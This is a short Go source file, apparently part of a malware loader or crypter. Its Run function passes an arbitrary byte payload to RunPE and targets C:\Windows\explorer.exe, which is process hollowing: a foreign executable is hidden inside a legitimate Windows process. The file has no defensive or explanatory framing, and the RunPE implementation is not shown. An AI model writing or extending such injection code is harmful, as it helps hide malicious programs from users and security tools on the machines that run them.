package internal

func Run(file []byte) {
	srcEXE := "C:\\Windows\\explorer.exe"
	RunPE(srcEXE, file, true)
}
